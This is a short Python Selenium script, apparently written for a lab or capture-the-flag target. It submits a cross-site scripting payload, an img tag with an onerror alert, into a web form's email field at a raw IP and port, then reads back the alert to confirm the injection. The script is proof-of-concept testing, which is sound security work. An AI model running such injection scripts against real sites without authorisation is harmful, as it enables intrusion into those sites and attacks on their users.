from selenium import webdriver
from selenium.webdriver.common.alert import Alert
driver = webdriver.Chrome()

url = "http://83.136.254.53:45241"
driver.get(url)

email_field = driver.find_element_by_id("email")

email_field.send_keys("<img src=a onerror=alert()>")

email_field.submit()

print(Alert(driver).text)

driver.quit()
